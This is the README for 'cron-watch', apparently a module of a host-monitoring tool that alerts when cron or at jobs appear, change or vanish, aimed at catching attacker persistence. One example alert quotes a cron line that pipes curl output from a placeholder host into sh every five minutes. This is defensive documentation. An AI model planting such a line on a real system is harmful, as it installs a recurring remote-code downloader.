# cron-watch (520)

Watches the places cron and at jobs live and alerts when one is added, changed
or removed, quoting the lines that were added.

## What it's for

Once in, an attacker wants to stay in, and a job that runs on a schedule is
the easiest way: a cron job that re-downloads the implant every hour, an
`@reboot` line, or an `at` job that brings it back later. Every one of them is
a file appearing or changing in a short list of places.

Other persistence spots belong to other skills:

- systemd services and timers: [systemd-watch](../systemdwatch/README.md)
- `~/.config/autostart/`: [dir-watch](../dirwatch/README.md)
- `/etc/rc.local`, `/etc/profile.d/`, `~/.bashrc`, `~/.profile`: [file-watch](../filewatch/README.md) with `wa`

## How it works

It uses inotify, so it changes nothing on the system and needs no approval.
Each configured path is watched along with the directory holding it, so a
file replaced by rename (as `crontab -e`, editors and dpkg do) or a directory
created after startup is still seen. Directories are watched one level deep,
which is as far as cron, run-parts and atd look.

At startup it reads every watched file. When a path changes it waits a second
for the writes to settle, then compares it with what it read before:

| Alert | Severity | When |
|---|---|---|
| New Scheduled Job | CONTACT | A file or directory appeared |
| Scheduled Job Changed | CONTACT | Content, mode or owner changed |
| Scheduled Job Removed | MOVEMENT | It's gone (atd removes an at job once it has run) |

The alert's Equipment line quotes up to three added lines, ignoring blanks and
comments, e.g. `+ */5 * * * * root curl -s http://x | sh`, and names a mode
change (run-parts only runs executable scripts) or an owner change (cron runs
a spool crontab as its owner). Unit is the file's owner.

Not reported:

- Temporary files that are gone by the time the path settles, such as the
  `tmp.XXXXXX` that `crontab -e` writes before renaming it
- A file rewritten with the same content, owner and mode
- Names neither Debian's cron and run-parts nor cronie runs: dotfiles (at's
  `.SEQ`, editor swap files) and `name~` backups. Names only Debian skips,
  like `x.dpkg-old`, are still reported, as cronie runs them
- `=job` in an at spool (`atjobs` or `at`), which is atd's name for an at job
  while it runs it

While dpkg holds its lock, changes are MOVEMENT rather than CONTACT, with
"dpkg was running" in Unit: packages install and update cron jobs as a matter
of course, and [pkg-monitor](../pkgmonitor/README.md) reports the package.
Root could hold the lock to get the same treatment, so the alert is lowered,
never dropped.

A symlink in a watched directory is reported as one, with its target and the
target's job lines. cron reads through it, but only the link is watched: once
it exists, edits to the target aren't seen. A new symlink in a cron directory
is suspicious in itself, all the more so to a file outside it.

File names and quoted lines come from whoever wrote the file, so anything that
isn't plainly visible text in them (newlines, control characters, right-to-left
overrides that would disguise a command) is shown as `?`.

inotify can't say which process made a change. Watch `/etc/cron.d` with
[dir-watch](../dirwatch/README.md) too if you want that. Changes made while
fogbot wasn't running aren't seen: the comparison starts from what is on disk
when it starts. If the kernel's inotify queue overflows, every watched path is
checked again so nothing is missed.

## Requirements

- inotify
- root, to read `/var/spool/cron/crontabs` and `/var/spool/cron/atjobs`

## Configuration

Set in `/etc/fogbot/skills-available/520-cron-watch.yaml` (shipped from
`usr/share/fogbot/contrib/skills-available/520-cron-watch.yaml`).

```yaml
config:
  watch_paths:
    - /etc/crontab
    - /etc/cron.d
    - /etc/cron.daily
    - /etc/cron.hourly
    - /etc/cron.monthly
    - /etc/cron.weekly
    - /var/spool/cron/crontabs
    - /var/spool/cron/atjobs
```

| Key | Default | Meaning |
|---|---|---|
| `watch_paths` | the list above | Absolute files and directories to watch. A path that doesn't exist is watched for; one whose directory doesn't exist is skipped with a log line |

## Examples

**Fedora/RHEL spool paths.** The defaults are Debian's. On Red Hat-family
systems user crontabs and at jobs live elsewhere:

```yaml
    - /var/spool/cron
    - /var/spool/at
```

**anacron.** If anacron is installed, add `/etc/anacrontab` too.

**A workstation with no cron jobs of its own.** If `crontab -l` is empty for
every user and you never use `at`, any alert from the spool directories is
someone else's job. Keep them in the list even if `at` isn't installed: the
`atjobs` directory is watched for, and installing `at` to schedule a job shows
up as the directory appearing.

## Enabling

```bash
sudo fogbot skill enable cron-watch
```
